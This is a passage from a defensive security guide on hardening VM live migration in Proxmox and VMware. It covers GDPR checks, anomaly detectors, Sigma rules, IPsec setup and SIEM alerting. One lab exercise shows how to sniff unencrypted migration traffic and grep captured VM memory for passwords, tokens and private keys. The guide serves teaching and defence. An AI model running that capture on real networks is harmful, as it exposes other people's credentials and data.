    if [ "$DEST_REGION" != "EU" ] && [ "$DEST_REGION" != "UK" ]; then
        echo "[GDPR BLOCK] VM $VM_ID contains EU personal data"
        echo "  Cannot migrate from $SOURCE_NODE ($SOURCE_REGION) to $DEST_NODE ($DEST_REGION)"
        echo "  GDPR Article 44 violation — transfer to $DEST_REGION not permitted"
        logger -p auth.crit -t gdpr-migration \
            "BLOCKED: VM $VM_ID migration to non-EU/UK region $DEST_REGION"
        exit 1
    fi
fi

echo "[GDPR OK] Migration permitted: $SOURCE_NODE → $DEST_NODE (both in allowed regions)"
exit 0
```

**VMware affinity rules for geographic pinning:**

```
# PowerCLI: Create DRS rule to pin GDPR VMs to EU hosts
$euHosts = Get-VMHost -Location "EU-Datacenter"
$gdprVMs = Get-VM -Tag "GDPR-PersonalData"

# Create VM-Host affinity rule (required — hard rule)
New-DrsVMHostRule -Cluster "Global-Cluster" `
    -Name "GDPR-EU-Only" `
    -VMGroup "GDPR-VMs" `
    -VMHostGroup "EU-Hosts" `
    -Type MustRunOn

# This prevents vMotion/DRS from migrating GDPR VMs outside EU
```

---

## 9. Monitoring and Detection

### 9.1 Detecting Unauthorized Migrations

**API audit log analysis:**

```bash
# Proxmox: Extract migration events from task log
pvesh get /cluster/tasks --typefilter "qmigrate" --limit 100 --output-format json | \
    jq '.[] | {
        starttime: (.starttime | strftime("%Y-%m-%dT%H:%M:%SZ")),
        user: .user,
        node: .node,
        vmid: ((.id // "") | split(":")[0]),
        status: .status
    }'

# Real-time monitoring of migration events
journalctl -f -u pvedaemon | grep -i --line-buffered "migrat"
```

**vCenter migration event monitoring:**

```
# PowerCLI: Query vCenter event log for all migration events
$events = Get-VIEvent -MaxSamples 1000 -Start (Get-Date).AddDays(-7) | 
    Where-Object { 
        $_ -is [VMware.Vim.VmMigratedEvent] -or
        $_ -is [VMware.Vim.VmBeingMigratedEvent] -or
        $_ -is [VMware.Vim.DrsVmMigratedEvent] -or
        $_ -is [VMware.Vim.VmBeingHotMigratedEvent]
    }

$events | Select-Object @{N='Time';E={$_.CreatedTime}},
    @{N='VM';E={$_.Vm.Name}},
    @{N='User';E={$_.UserName}},
    @{N='Source';E={$_.Host.Name}},
    @{N='Destination';E={$_.DestHost.Name}},
    @{N='Type';E={$_.GetType().Name}} |
    Sort-Object Time -Descending |
    Format-Table -AutoSize

# Alert on non-DRS-initiated migrations (human-triggered)
$manualMigrations = $events | Where-Object {
    $_ -is [VMware.Vim.VmMigratedEvent] -and
    $_.UserName -ne "VSPHERE.LOCAL\vpxd-extension-*"
}

if ($manualMigrations.Count -gt 0) {
    Write-Warning "ALERT: $($manualMigrations.Count) manual migration(s) detected!"
    $manualMigrations | ForEach-Object {
        Write-Warning "  $($_.CreatedTime) | $($_.UserName) | $($_.Vm.Name)"
    }
}
```

### 9.2 Anomaly Detection: Unusual Migration Patterns

```python
#!/usr/bin/env python3
"""
Migration anomaly detection engine.
Monitors for:
- Off-hours migrations
- Unusual source/destination pairs
- High-frequency migration (VM thrashing)
- Migrations by unauthorized users
"""
import json
import sys
from datetime import datetime, time
from collections import defaultdict, Counter
from typing import NamedTuple

class MigrationEvent(NamedTuple):
    timestamp: datetime
    user: str
    vm_id: str
    source_node: str
    dest_node: str
    status: str

# Configuration
BUSINESS_HOURS = (time(8, 0), time(20, 0))  # 08:00-20:00
AUTHORIZED_USERS = {"root@pam", "admin@pve", "migration-svc@pve"}
MAX_MIGRATIONS_PER_VM_PER_HOUR = 3
KNOWN_MIGRATION_PAIRS = {
    ("pve01", "pve02"), ("pve02", "pve01"),
    ("pve01", "pve03"), ("pve03", "pve01"),
    ("pve02", "pve03"), ("pve03", "pve02"),
}

class MigrationAnomalyDetector:
    def __init__(self):
        self.vm_migration_history = defaultdict(list)
        self.alerts = []
    
    def analyze_event(self, event: MigrationEvent) -> list:
        """Analyze a single migration event for anomalies."""
        alerts = []
        
        # Check 1: Off-hours migration
        event_time = event.timestamp.time()
        if not (BUSINESS_HOURS[0] <= event_time <= BUSINESS_HOURS[1]):
            if event.timestamp.weekday() < 5:  # Weekday
                alerts.append({
                    "severity": "HIGH",
                    "type": "OFF_HOURS_MIGRATION",
                    "detail": f"Migration at {event_time} outside business hours",
                    "event": event._asdict()
                })
            else:  # Weekend
                alerts.append({
                    "severity": "CRITICAL",
                    "type": "WEEKEND_MIGRATION",
                    "detail": f"Weekend migration detected",
                    "event": event._asdict()
                })
        
        # Check 2: Unauthorized user
        if event.user not in AUTHORIZED_USERS:
            alerts.append({
                "severity": "CRITICAL",
                "type": "UNAUTHORIZED_USER",
                "detail": f"Migration by unauthorized user: {event.user}",
                "event": event._asdict()
            })
        
        # Check 3: Unknown migration pair
        pair = (event.source_node, event.dest_node)
        if pair not in KNOWN_MIGRATION_PAIRS:
            alerts.append({
                "severity": "HIGH",
                "type": "UNKNOWN_MIGRATION_PATH",
                "detail": f"Unknown migration path: {pair}",
                "event": event._asdict()
            })
        
        # Check 4: VM thrashing (too many migrations)
        self.vm_migration_history[event.vm_id].append(event.timestamp)
        recent = [t for t in self.vm_migration_history[event.vm_id]
                  if (event.timestamp - t).total_seconds() < 3600]
        self.vm_migration_history[event.vm_id] = recent
        
        if len(recent) > MAX_MIGRATIONS_PER_VM_PER_HOUR:
            alerts.append({
                "severity": "HIGH",
                "type": "VM_THRASHING",
                "detail": f"VM {event.vm_id} migrated {len(recent)} times in 1 hour",
                "event": event._asdict()
            })
        
        # Check 5: Failed migration (potential attack attempt)
        if event.status != "OK":
            alerts.append({
                "severity": "MEDIUM",
                "type": "MIGRATION_FAILURE",
                "detail": f"Migration failed: {event.status}",
                "event": event._asdict()
            })
        
        return alerts

    def output_alerts(self, alerts: list):
        """Output alerts in SIEM-compatible format."""
        for alert in alerts:
            alert["detection_time"] = datetime.utcnow().isoformat() + "Z"
            alert["detector"] = "migration-anomaly-engine"
            print(json.dumps(alert))
            # In production: forward to SIEM via syslog/API

if __name__ == "__main__":
    detector = MigrationAnomalyDetector()
    
    # Read events from stdin (pipe from journalctl or event log parser)
    for line in sys.stdin:
        try:
            data = json.loads(line.strip())
            event = MigrationEvent(
                timestamp=datetime.fromisoformat(data["timestamp"]),
                user=data["user"],
                vm_id=str(data["vmid"]),
                source_node=data["source"],
                dest_node=data["destination"],
                status=data.get("status", "OK")
            )
            alerts = detector.analyze_event(event)
            if alerts:
                detector.output_alerts(alerts)
        except (json.JSONDecodeError, KeyError) as e:
            sys.stderr.write(f"Parse error: {e}\n")
```

### 9.3 Sigma Rules for Migration-Related Alerts

```yaml
# sigma/rules/virtualization/vm_unauthorized_migration.yml
title: Unauthorized VM Live Migration Detected
id: 8a4d3f92-c71e-4b8a-9f42-1234567890ab
status: experimental
description: |
    Detects VM live migration events initiated by unauthorized users
    or occurring outside maintenance windows.
references:
    - https://attack.mitre.org/techniques/T1612/
    - https://attack.mitre.org/techniques/T1537/
author: Security Operations
date: 2026-05-07
modified: 2026-05-07
tags:
    - attack.defense_evasion
    - attack.t1612
    - attack.lateral_movement
logsource:
    product: vmware
    service: vcenter
    category: vm_migration
detection:
    selection_migration:
        EventType:
            - 'VmMigratedEvent'
            - 'VmBeingMigratedEvent'
            - 'VmBeingHotMigratedEvent'
    filter_authorized_systems:
        UserName|contains:
            - 'vpxd-extension'
            - 'VSPHERE.LOCAL\\migration-svc'
    filter_drs:
        EventType: 'DrsVmMigratedEvent'
    condition: selection_migration and not filter_authorized_systems and not filter_drs
level: high
falsepositives:
    - Legitimate manual migrations during maintenance
    - Disaster recovery failover events
---
# sigma/rules/virtualization/vm_migration_off_hours.yml
title: VM Migration Outside Maintenance Window
id: 7b5c2e81-d62f-4c9b-ae31-fedcba098765
status: experimental
description: Detects VM migration events occurring outside defined maintenance windows.
author: Security Operations
date: 2026-05-07
tags:
    - attack.defense_evasion
    - attack.t1612
logsource:
    product: proxmox
    service: pvedaemon
detection:
    selection:
        task_type: 'qmigrate'
    timeframe:
        # Outside business hours (UTC)
        - time|gte: '20:00:00'
        - time|lte: '08:00:00'
    condition: selection and timeframe
level: high
falsepositives:
    - Scheduled DR drills
    - Emergency failover during outage
---
# sigma/rules/virtualization/vm_migration_encryption_disabled.yml
title: VM Migration Without Encryption
id: 6c7d4f23-e83g-5dab-bf42-abcdef123456
status: experimental
description: |
    Detects VM migration events where encryption was not used,
    indicating potential configuration drift or downgrade attack.
author: Security Operations
date: 2026-05-07
tags:
    - attack.credential_access
    - attack.collection
    - attack.t1040
logsource:
    product: vmware
    service: vcenter
detection:
    selection:
        EventType:
            - 'VmMigratedEvent'
            - 'VmBeingHotMigratedEvent'
    encryption_status:
        MigrateEncryption|contains:
            - 'disabled'
            - 'opportunistic'
    condition: selection and encryption_status
level: critical
falsepositives:
    - Lab/dev environments with intentionally relaxed settings
---
# sigma/rules/virtualization/vm_migration_network_anomaly.yml
title: VM Migration Traffic on Production Network
id: 5e8f6g34-f94h-6ebc-cg53-bcdefg234567
status: experimental
description: |
    Detects vMotion/migration protocol traffic on non-migration network
    interfaces, indicating misconfiguration or network compromise.
author: Security Operations
date: 2026-05-07
tags:
    - attack.lateral_movement
    - attack.discovery
logsource:
    product: firewall
    category: network_connection
detection:
    selection_ports:
        dst_port:
            - 8000    # vMotion
            - 8002    # vMotion (alternate)
            - 49152   # QEMU migration
            - 49153
    filter_migration_network:
        src_ip|cidr:
            - '10.200.0.0/24'
        dst_ip|cidr:
            - '10.200.0.0/24'
    condition: selection_ports and not filter_migration_network
level: critical
falsepositives:
    - None expected — migration traffic should never appear on non-migration networks
```

### 9.4 Splunk/Elastic Queries for Migration Events

**Elasticsearch query for migration anomalies:**

```json
{
  "query": {
    "bool": {
      "must": [
        {
          "match": {
            "event.category": "virtualization"
          }
        },
        {
          "terms": {
            "event.action": ["vm.migrate", "VmMigratedEvent", "qmigrate"]
          }
        }
      ],
      "should": [
        {
          "bool": {
            "must_not": {
              "terms": {
                "user.name": ["vpxd-extension", "migration-svc@pve", "root@pam"]
              }
            }
          }
        },
        {
          "script": {
            "script": {
              "source": "doc['@timestamp'].value.getHour() < 8 || doc['@timestamp'].value.getHour() >= 20"
            }
          }
        }
      ],
      "minimum_should_match": 1
    }
  },
  "aggs": {
    "by_vm": {
      "terms": { "field": "vm.id" },
      "aggs": {
        "migration_count": { "value_count": { "field": "event.action" } },
        "unique_destinations": { "cardinality": { "field": "destination.host.name" } }
      }
    }
  }
}
```

**Syslog-ng configuration for forwarding migration events:**

```bash
# /etc/syslog-ng/conf.d/migration-events.conf
# Forward migration-related events to SIEM

source s_migration {
    file("/var/log/pvedaemon.log" follow-freq(1));
    file("/var/log/syslog" follow-freq(1));
};

filter f_migration {
    match("migrat" value("MESSAGE") flags(ignore-case)) or
    match("MIGRATION_DROP" value("MESSAGE")) or
    match("qmigrate" value("MESSAGE"));
};

destination d_siem {
    syslog("siem.internal" 
        port(514)
        transport("tls")
        tls(
            ca-dir("/etc/syslog-ng/ca.d")
            key-file("/etc/syslog-ng/migration-client.key")
            cert-file("/etc/syslog-ng/migration-client.pem")
        )
    );
};

log {
    source(s_migration);
    filter(f_migration);
    destination(d_siem);
    flags(flow-control);
};
```

---

## 10. Lab Exercises

### Exercise 1: Configure Encrypted Migration on Proxmox with Dedicated Network

**Objective:** Set up a secure migration infrastructure with dedicated network, encryption verification, and firewall lockdown.

**Prerequisites:**
- 2+ Proxmox VE 8.x nodes in a cluster
- Each node has at least 2 NICs (one for management, one for migration)
- A managed switch with VLAN support

**Steps:**

```bash
# === STEP 1: Configure dedicated migration network ===

# On EACH Proxmox node, configure migration interface
# Node 1 (pve01):
cat >> /etc/network/interfaces << 'EOF'

# Migration network - VLAN 200
auto ens1f1
iface ens1f1 inet manual
    mtu 9000

auto vmbr-mig
iface vmbr-mig inet static
    address 10.200.0.11/24
    bridge-ports ens1f1
    bridge-stp off
    bridge-fd 0
    mtu 9000
    # No gateway - non-routable
EOF

# Node 2 (pve02):
# Same but address 10.200.0.12/24

# Apply network config
ifreload -a

# Verify connectivity
ping -c 3 -I vmbr-mig 10.200.0.12

# === STEP 2: Configure Proxmox to use migration network ===
# Edit datacenter config (replicated to all nodes automatically)
cat >> /etc/pve/datacenter.cfg << 'EOF'
migration: secure,network=10.200.0.0/24
EOF

# === STEP 3: Harden SSH for migration ===
# /etc/ssh/sshd_config — restrict ciphers
cat > /etc/ssh/sshd_config.d/migration-hardening.conf << 'EOF'
# Migration SSH hardening
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
MACs hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org
HostKeyAlgorithms ssh-ed25519,rsa-sha2-512

# Disable password authentication (cert/key only)
PasswordAuthentication no
PubkeyAuthentication yes
EOF

systemctl restart sshd

# === STEP 4: Deploy nftables firewall on migration interface ===
cat > /etc/nftables.d/50-migration.conf << 'EOF'
table inet migration {
    set peers {
        type ipv4_addr
        elements = { 10.200.0.11, 10.200.0.12, 10.200.0.13 }
    }
    
    chain input {
        type filter hook input priority 0; policy accept;
        iifname "vmbr-mig" ip saddr != @peers drop
        iifname "vmbr-mig" tcp dport != 22 drop
    }
    
    chain output {
        type filter hook output priority 0; policy accept;
        oifname "vmbr-mig" ip daddr != @peers drop
    }
    
    chain forward {
        type filter hook forward priority 0; policy accept;
        iifname "vmbr-mig" drop
        oifname "vmbr-mig" drop
    }
}
EOF

nft -f /etc/nftables.d/50-migration.conf
nft list table inet migration

# === STEP 5: Test migration ===
# Create a test VM
qm create 9001 --name "migration-test" --memory 2048 --cores 2 \
    --net0 virtio,bridge=vmbr0 --scsi0 local-lvm:32 \
    --ostype l26 --boot c --bootdisk scsi0

qm start 9001

# Migrate to second node
qm migrate 9001 pve02 --online

# === STEP 6: Verify encryption was used ===
# During migration, on source node:
tcpdump -i vmbr-mig -nn -c 50 -w /tmp/migration-verify.pcap 'tcp port 22'

# Analyze entropy (should be >7.9 bits/byte for encrypted)
python3 << 'PYEOF'
import math
from collections import Counter

with open("/tmp/migration-verify.pcap", "rb") as f:
    data = f.read()

if len(data) == 0:
    print("No data captured")
else:
    freq = Counter(data)
    total = len(data)
    entropy = -sum((c/total) * math.log2(c/total) for c in freq.values())
    print(f"Entropy: {entropy:.4f} bits/byte")
    if entropy > 7.9:
        print("[PASS] Traffic appears encrypted")
    else:
        print("[FAIL] Traffic may not be encrypted!")
PYEOF
```

**Validation checklist:**
- [ ] Migration uses dedicated vmbr-mig interface (not vmbr0)
- [ ] Traffic is SSH-tunneled (only TCP port 22 on migration network)
- [ ] Firewall blocks non-peer traffic on migration interface
- [ ] No forwarding through migration bridge
- [ ] Entropy analysis confirms encryption
- [ ] Migration succeeds with encryption enforced

---

### Exercise 2: Capture and Analyze Unencrypted Migration Traffic (Lab Only)

**Objective:** Demonstrate the risk of unencrypted migration by capturing and analyzing migration data in a controlled lab environment.

> **CRITICAL WARNING:** This exercise must ONLY be performed in an isolated lab environment with no production data. Never perform on systems containing real user data, credentials, or regulated information.

**Lab setup requirements:**
- Isolated lab network (no connection to production)
- 2 Proxmox nodes configured with `migration: insecure` (ONLY for this lab)
- Test VM with known data patterns for verification
- Attacker workstation on same L2 segment

```bash
# === LAB SETUP: Temporarily configure insecure migration ===
# (ONLY in isolated lab — NEVER in production)

# On lab nodes, temporarily set insecure migration
# /etc/pve/datacenter.cfg
# migration: insecure

# === STEP 1: Prepare test VM with identifiable data ===
# Inside the test VM, create known patterns that can be found in memory:
# (Run these INSIDE the guest VM)
cat > /tmp/secret_data.txt << 'EOF'
MIGRATION_TEST_SECRET_KEY=SuperSecretTestKey12345
DATABASE_PASSWORD=TestDBPass_NotReal_LabOnly
API_TOKEN=tok_test_ABCDEFGHIJKLMNOP
EOF

# Load into memory and keep resident
python3 -c "
data = open('/tmp/secret_data.txt').read()
# Keep in memory indefinitely
import time
print('Data loaded into memory. Keeping process alive...')
while True:
    time.sleep(60)
" &

# === STEP 2: Set up packet capture on attacker workstation ===
# On the attacker system (same L2 as migration network):

# Capture QEMU migration traffic (default port range 49152-49215)
tcpdump -i eth0 -nn -w /tmp/lab_migration_capture.pcap \
    'tcp portrange 49152-49215'

# === STEP 3: Trigger migration ===
# From one of the lab nodes:
qm migrate 9001 pve02-lab --online

# === STEP 4: Analyze captured traffic ===
# Stop tcpdump after migration completes

# Search for known patterns in capture
strings /tmp/lab_migration_capture.pcap | grep -i "MIGRATION_TEST_SECRET"
# Expected: Should find "MIGRATION_TEST_SECRET_KEY=SuperSecretTestKey12345"

strings /tmp/lab_migration_capture.pcap | grep -i "DATABASE_PASSWORD"
# Expected: Should find the test password in cleartext

# More thorough analysis
strings /tmp/lab_migration_capture.pcap | grep -iE \
    '(password|secret|token|key|private|session)' | head -30

# === STEP 5: Quantify the exposure ===
echo "=== Migration Capture Analysis ==="
PCAP_SIZE=$(stat -c%s /tmp/lab_migration_capture.pcap)
echo "Total capture size: $((PCAP_SIZE / 1048576)) MB"

STRINGS_COUNT=$(strings /tmp/lab_migration_capture.pcap | wc -l)
echo "Readable strings found: $STRINGS_COUNT"

# Search for common credential patterns
echo ""
echo "Credential pattern search:"
strings /tmp/lab_migration_capture.pcap | grep -cP '-----BEGIN.*PRIVATE KEY' && \
    echo "  Private keys found!" || echo "  No private keys"
strings /tmp/lab_migration_capture.pcap | grep -cP 'password\s*[:=]' && \
    echo "  Password references found!" || echo "  No password refs"

# === STEP 6: CRITICAL — Restore secure configuration ===
# Immediately after lab exercise:
# /etc/pve/datacenter.cfg
# migration: secure,network=10.200.0.0/24

# Clean up lab captures
shred -u /tmp/lab_migration_capture.pcap
shred -u /tmp/secret_data.txt
```

**Lab report questions:**
1. What percentage of the VM's memory could you recover from the capture?
2. How many credential-like strings were found in the capture?
3. Could you reconstruct application state from the captured memory?
4. What is the time window an attacker has to capture this data?
5. How does this compare to the effort needed to attack encrypted migration?

---

### Exercise 3: Implement IPsec Tunnel for Cross-Site Migration

**Objective:** Configure a full IPsec tunnel between two Proxmox sites for secure cross-site migration.

```bash
# === TOPOLOGY ===
# Site A: 203.0.113.0/24 (public), 10.200.0.0/24 (migration)
# Site B: 198.51.100.0/24 (public), 10.200.1.0/24 (migration)
# Gateway A: 203.0.113.1
# Gateway B: 198.51.100.1
# Proxmox A: 10.200.0.11 (migration), 203.0.113.10 (WAN)
# Proxmox B: 10.200.1.11 (migration), 198.51.100.10 (WAN)

# === STEP 1: Install strongSwan on both gateway nodes ===
apt install strongswan strongswan-pki libcharon-extra-plugins

# === STEP 2: Generate PKI (on a secure workstation) ===
# Root CA
pki --gen --type ed25519 --outform pem > ca-key.pem
pki --self --ca --lifetime 3650 --in ca-key.pem \
    --dn "CN=Migration CA, O=Lab Corp" --outform pem > ca-cert.pem

# Site A certificate
pki --gen --type ed25519 --outform pem > siteA-key.pem
pki --issue --cacert ca-cert.pem --cakey ca-key.pem \
    --lifetime 730 --in siteA-key.pem \
    --dn "CN=gateway-siteA.lab.corp" \
    --san "203.0.113.10" \
    --flag serverAuth --flag clientAuth \
    --outform pem > siteA-cert.pem

# Site B certificate
pki --gen --type ed25519 --outform pem > siteB-key.pem
pki --issue --cacert ca-cert.pem --cakey ca-key.pem \
    --lifetime 730 --in siteB-key.pem \
    --dn "CN=gateway-siteB.lab.corp" \
    --san "198.51.100.10" \
    --flag serverAuth --flag clientAuth \
    --outform pem > siteB-cert.pem

# === STEP 3: Deploy certificates ===
# On Site A:
cp ca-cert.pem /etc/swanctl/x509ca/
cp siteA-cert.pem /etc/swanctl/x509/
cp siteA-key.pem /etc/swanctl/private/
chmod 600 /etc/swanctl/private/siteA-key.pem

# On Site B:
cp ca-cert.pem /etc/swanctl/x509ca/
cp siteB-cert.pem /etc/swanctl/x509/
cp siteB-key.pem /etc/swanctl/private/
chmod 600 /etc/swanctl/private/siteB-key.pem

# === STEP 4: Configure strongSwan — Site A ===
cat > /etc/swanctl/conf.d/cross-site-migration.conf << 'EOF'
connections {
    cross-site-mig {
        version = 2
        local_addrs = 203.0.113.10
        remote_addrs = 198.51.100.10
        
        local {
            auth = pubkey
            certs = siteA-cert.pem
            id = "CN=gateway-siteA.lab.corp"
        }
        remote {
            auth = pubkey
            id = "CN=gateway-siteB.lab.corp"
        }
        
        children {
            migration {
                local_ts = 10.200.0.0/24
                remote_ts = 10.200.1.0/24
                esp_proposals = aes256gcm16-x25519
                rekey_time = 3600
                rekey_bytes = 53687091200
                start_action = trap
                dpd_action = restart
            }
        }
        
        proposals = aes256-sha384-x25519
        rekey_time = 14400
        dpd_delay = 30
    }
}
EOF

# === STEP 5: Configure strongSwan — Site B ===
# (Mirror of Site A with local/remote swapped)
cat > /etc/swanctl/conf.d/cross-site-migration.conf << 'EOF'
connections {
    cross-site-mig {
        version = 2
        local_addrs = 198.51.100.10
        remote_addrs = 203.0.113.10
        
        local {
            auth = pubkey
            certs = siteB-cert.pem
            id = "CN=gateway-siteB.lab.corp"
        }
        remote {
            auth = pubkey
            id = "CN=gateway-siteA.lab.corp"
        }
        
        children {
            migration {
                local_ts = 10.200.1.0/24
                remote_ts = 10.200.0.0/24
                esp_proposals = aes256gcm16-x25519
                rekey_time = 3600
                rekey_bytes = 53687091200
                start_action = trap
                dpd_action = restart
            }
        }
        
        proposals = aes256-sha384-x25519
        rekey_time = 14400
        dpd_delay = 30
    }
}
EOF

# === STEP 6: Start and verify ===
# On both sites:
systemctl enable --now strongswan
swanctl --load-all

# Initiate tunnel (trigger with traffic)
ping -c 3 -I 10.200.0.11 10.200.1.11

# Verify SA establishment
swanctl --list-sas
# Expected: ESTABLISHED state with ESP child SA

# === STEP 7: Configure Proxmox cross-site migration ===
# On Site A Proxmox, add Site B as a reachable migration target
# through the IPsec tunnel:
ip route add 10.200.1.0/24 via 203.0.113.1 dev vmbr-mig table migration
ip rule add from 10.200.0.0/24 to 10.200.1.0/24 table migration

# === STEP 8: Test cross-site migration ===
# Add Site B node SSH key
ssh-keyscan -H 10.200.1.11 >> /root/.ssh/known_hosts

# Test migration (requires shared storage or offline migration)
qm migrate 9001 pve01-siteB --online --targetstorage siteB-storage

# === STEP 9: Verify encryption ===
# Capture on WAN interface — should show ESP packets only
tcpdump -i ens1f0 -nn -c 20 'host 198.51.100.10'
# Expected: Only ESP protocol (protocol 50), no cleartext

# === STEP 10: Monitor tunnel health ===
watch -n 5 'swanctl --list-sas | grep -E "(ESTABLISHED|bytes_in|bytes_out)"'
```

**Validation checklist:**
- [ ] IPsec tunnel establishes with certificate authentication
- [ ] Migration traffic traverses IPsec (ESP packets on WAN)
- [ ] No cleartext migration data visible on WAN capture
- [ ] Tunnel re-establishes after simulated link failure
- [ ] Rekey occurs within configured interval
- [ ] DPD detects peer failure within 30 seconds

---

### Exercise 4: Build SIEM Alerting for Unauthorized VM Migrations

**Objective:** Implement end-to-end detection and alerting for unauthorized or suspicious VM migration events.

```bash
# === STEP 1: Configure Proxmox event logging ===

# Ensure pvedaemon logs are captured by syslog
cat > /etc/rsyslog.d/50-pve-migration.conf << 'EOF'
# Log all PVE migration events to dedicated file
:programname, isequal, "pvedaemon" /var/log/pve-migration.log
:msg, contains, "qmigrate" /var/log/pve-migration.log
:msg, contains, "migration" /var/log/pve-migration.log

# Also forward to SIEM
:msg, contains, "migrate" @@siem.internal:514;RSYSLOG_SyslogProtocol23Format
EOF

systemctl restart rsyslog

# === STEP 2: Create migration event parser ===
cat > /usr/local/bin/migration-event-parser.py << 'PYEOF'
#!/usr/bin/env python3
"""
Parse Proxmox migration events and output structured JSON for SIEM.
Run as: tail -F /var/log/pve-migration.log | migration-event-parser.py
"""
import sys
import re
import json
from datetime import datetime

MIGRATION_PATTERNS = [
    # qm migrate started
    re.compile(
        r'(?P<timestamp>\w+\s+\d+\s+[\d:]+)\s+(?P<host>\S+)\s+pvedaemon\[.*\]:\s+'
        r'starting migration of VM (?P<vmid>\d+) to node \'(?P<destination>\S+)\''
    ),
    # Task started
    re.compile(
        r'(?P<timestamp>\w+\s+\d+\s+[\d:]+)\s+(?P<host>\S+)\s+.*'
        r'user (?P<user>\S+).*qmigrate (?P<vmid>\d+)'
    ),
    # Migration complete
    re.compile(
        r'(?P<timestamp>\w+\s+\d+\s+[\d:]+)\s+(?P<host>\S+)\s+.*'
        r'migration of VM (?P<vmid>\d+).*(?P<status>successfully|failed)'
    ),
]

def parse_line(line):
    for pattern in MIGRATION_PATTERNS:
        match = pattern.search(line)
        if match:
            event = match.groupdict()
            event['raw'] = line.strip()
            event['parsed_time'] = datetime.utcnow().isoformat() + 'Z'
            event['event_type'] = 'vm_migration'
            return event
    return None

if __name__ == "__main__":
    for line in sys.stdin:
        event = parse_line(line)
        if event:
            print(json.dumps(event), flush=True)
PYEOF

chmod +x /usr/local/bin/migration-event-parser.py

# === STEP 3: Create alerting rules ===
cat > /usr/local/bin/migration-alerter.py << 'PYEOF'
#!/usr/bin/env python3
"""
Real-time alerting on suspicious migration events.
Reads parsed events from stdin, triggers alerts via webhook.
"""
import sys
import json
import os
from datetime import datetime, time
import urllib.request

WEBHOOK_URL = os.environ.get("ALERT_WEBHOOK", "http://localhost:8080/alert")
AUTHORIZED_USERS = {"root@pam", "admin@pve", "migration-svc@pve"}
MAINTENANCE_HOURS = (time(22, 0), time(6, 0))  # 22:00-06:00 is normal maintenance

def is_maintenance_window():
    now = datetime.utcnow().time()
    if MAINTENANCE_HOURS[0] > MAINTENANCE_HOURS[1]:  # Crosses midnight
        return now >= MAINTENANCE_HOURS[0] or now <= MAINTENANCE_HOURS[1]
    return MAINTENANCE_HOURS[0] <= now <= MAINTENANCE_HOURS[1]

def send_alert(severity, title, details):
    alert = {
        "severity": severity,
        "title": title,
        "details": details,
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "source": "migration-alerter"
    }
    
    # Output to stdout for logging
    print(f"[ALERT-{severity}] {title}", file=sys.stderr)
    
    # Send to webhook (SIEM/PagerDuty/Slack)
    try:
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=json.dumps(alert).encode(),
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=5)
    except Exception as e:
        print(f"[ERROR] Failed to send alert: {e}", file=sys.stderr)

def evaluate_event(event):
    """Evaluate a migration event against alerting rules."""
    user = event.get("user", "unknown")
    vmid = event.get("vmid", "unknown")
    
    # Rule 1: Unauthorized user
    if user not in AUTHORIZED_USERS and user != "unknown":
        send_alert(
            "CRITICAL",
            f"Unauthorized migration by {user}",
            f"VM {vmid} migrated by unauthorized user {user}"
        )
    
    # Rule 2: Off-hours migration (outside maintenance window)
    if not is_maintenance_window():
        send_alert(
            "HIGH",
            f"Migration outside maintenance window",
            f"VM {vmid} migration at {event.get('timestamp', 'unknown time')}"
        )
    
    # Rule 3: Migration failure (possible attack attempt)
    if event.get("status") == "failed":
        send_alert(
            "MEDIUM",
            f"Migration failure detected",
            f"VM {vmid} migration failed - investigate for attack attempt"
        )

if __name__ == "__main__":
    for line in sys.stdin:
        try:
            event = json.loads(line.strip())
            evaluate_event(event)
        except json.JSONDecodeError:
            continue
PYEOF

chmod +x /usr/local/bin/migration-alerter.py

# === STEP 4: Wire up the pipeline ===
cat > /etc/systemd/system/migration-monitor.service << 'EOF'
[Unit]
Description=VM Migration Security Monitor
After=rsyslog.service pvedaemon.service
Wants=rsyslog.service

[Service]
Type=simple
ExecStart=/bin/bash -c 'tail -F /var/log/pve-migration.log | /usr/local/bin/migration-event-parser.py | /usr/local/bin/migration-alerter.py'
Restart=always
RestartSec=5
Environment=ALERT_WEBHOOK=http://siem.internal:8080/api/alerts
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now migration-monitor

# === STEP 5: Test the alerting pipeline ===
# Trigger a test migration
qm migrate 9001 pve02 --online

# Check alerts were generated
journalctl -u migration-monitor --since "5 minutes ago" | grep ALERT

# === STEP 6: Integration with Elasticsearch/OpenSearch ===
# Filebeat configuration for shipping migration events
cat > /etc/filebeat/modules.d/pve-migration.yml << 'EOF'
- module: pve-migration
  access:
    enabled: true
    var.paths:
      - /var/log/pve-migration.log
    input:
      type: log
      json.keys_under_root: false
      json.add_error_key: true
      processors:
        - decode_json_fields:
            fields: ["message"]
            target: "migration"
        - add_fields:
            target: event
            fields:
              category: virtualization
              type: info
              kind: event
              module: proxmox-migration
EOF

# === STEP 7: Grafana dashboard query (InfluxDB/Prometheus) ===
# For Prometheus-based monitoring:
cat > /usr/local/bin/migration-metrics-exporter.py << 'PYEOF'
#!/usr/bin/env python3
"""
Prometheus metrics exporter for migration events.
Exposes metrics at :9199/metrics
"""
from prometheus_client import start_http_server, Counter, Gauge
import sys
import json
import threading

# Metrics
migration_total = Counter(
    'vm_migration_total',
    'Total VM migrations',
    ['user', 'source', 'destination', 'status']
)
migration_unauthorized = Counter(
    'vm_migration_unauthorized_total',
    'Unauthorized migration attempts',
    ['user']
)
active_migrations = Gauge(
    'vm_migration_active',
    'Currently active migrations'
)

def process_events():
    for line in sys.stdin:
        try:
            event = json.loads(line.strip())
            migration_total.labels(
                user=event.get('user', 'unknown'),
                source=event.get('host', 'unknown'),
                destination=event.get('destination', 'unknown'),
                status=event.get('status', 'unknown')
            ).inc()
        except json.JSONDecodeError:
            continue

if __name__ == "__main__":
    start_http_server(9199)
    process_events()
PYEOF

chmod +x /usr/local/bin/migration-metrics-exporter.py
```

**Validation checklist:**
- [ ] Migration events are captured in /var/log/pve-migration.log
- [ ] Parser correctly extracts VM ID, user, source, destination
- [ ] Alerts fire for unauthorized users
- [ ] Alerts fire for off-hours migrations
- [ ] Alerts fire for migration failures
- [ ] SIEM receives events via syslog/webhook
- [ ] Dashboard shows migration metrics
